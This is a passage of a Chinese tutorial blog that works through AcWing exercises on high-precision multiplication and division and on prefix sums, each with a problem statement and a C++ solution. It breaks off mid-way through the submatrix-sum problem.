mathnormal">A</span></span></span></span>，第二行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>共一行，包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>×</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A \times B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的值。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>A</mi><mtext>的长度</mtext><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le A 的长度 \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">的长度</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>B</mi><mo>≤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">0 \le B \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>23</code></pre><p><strong>输出样例：</strong></p><pre><code>6</code></pre><h3 id="法1-高精度-低精度">法1 高精度 * 低精度</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    t += A[i] * b;</span><br><span class="line">    C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">    t /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (t) C.<span class="built_in">push_back</span>(t);</span><br><span class="line">  <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a;</span><br><span class="line">  <span class="type">int</span> b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  </span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C = <span class="built_in">mul</span>(A, b);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="法2-高精度-高精度">法2 高精度 * 高精度</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">C</span><span class="params">(A.size() + B.size() + <span class="number">1</span>, <span class="number">0</span>)</span></span>;  <span class="comment">// 初始化为0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; B.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">      C[i + j] += A[i] * B[j];  <span class="comment">// +=, 而非=</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; C.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    t += C[i];</span><br><span class="line">    C[i] = t % <span class="number">10</span>;</span><br><span class="line">    t /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (t) C.<span class="built_in">push_back</span>(t);</span><br><span class="line">  <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a, b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">auto</span> C = <span class="built_in">mul</span>(A, B);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-794-高精度除法"><a href="https://www.acwing.com/problem/content/796/">AcWing 794. 高精度除法</a></h2><p>给定两个非负整数（不含前导 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>） <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mtext>，</mtext><mi>B</mi></mrow><annotation encoding="application/x-tex">A，B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>，请你计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi mathvariant="normal">/</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A / B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的商和余数。</p><p><strong>输入格式</strong></p><p>共两行，第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>，第二行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>共两行，第一行输出所求的商，第二行输出所求余数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>A</mi><mtext>的长度</mtext><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le A的长度 \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">的长度</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>B</mi><mo>≤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">1 \le B \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 一定不为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>72</code></pre><p><strong>输出样例：</strong></p><pre><code>31</code></pre><h3 id="高精度除法">高精度除法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">div</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b, <span class="type">int</span> &amp;r)</span> </span>&#123;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;  <span class="comment">// 和+ - *不一样</span></span><br><span class="line">    r = <span class="number">10</span> * r + A[i];</span><br><span class="line">    C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">    r %= b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());  <span class="comment">// 让数字低位回到数组低位</span></span><br><span class="line">  <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a;</span><br><span class="line">  <span class="type">int</span> b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">auto</span> C = <span class="built_in">div</span>(A, b, r);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n%d\n&quot;</span>, r);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="前缀和与差分">前缀和与差分</h1><h2 id="AcWing-795-前缀和"><a href="https://www.acwing.com/problem/content/797/">AcWing 795. 前缀和</a></h2><p>输入一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数序列。</p><p>接下来再输入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个询问，每个询问输入一对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo separator="true">,</mo><mi>r</mi></mrow><annotation encoding="application/x-tex">l, r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>。</p><p>对于每个询问，输出原序列中从第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> 个数到第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 个数的和。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示整数数列。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行，每行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>，表示一个询问的区间范围。</p><p><strong>输出格式</strong></p><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行，每行输出一个询问的结果。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>l</mi><mo>≤</mo><mi>r</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le l \le r \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1000</mn><mo>≤</mo><mtext>数列中元素的值</mtext><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le 数列中元素的值 \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">数列中元素的值</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>5 32 1 3 6 41 21 32 4</code></pre><p><strong>输出样例：</strong></p><pre><code>3610</code></pre><h3 id="前缀和">前缀和</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], s[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;  <span class="comment">// 1到n</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i]);</span><br><span class="line">    s[i] += s[i - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[r] - s[l - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-796-子矩阵的和"><a href="https://www.acwing.com/activity/content/punch_the_clock/11/">AcWing 796. 子矩阵的和</a></h2><p>输入一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 列的整数矩阵，再输入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation 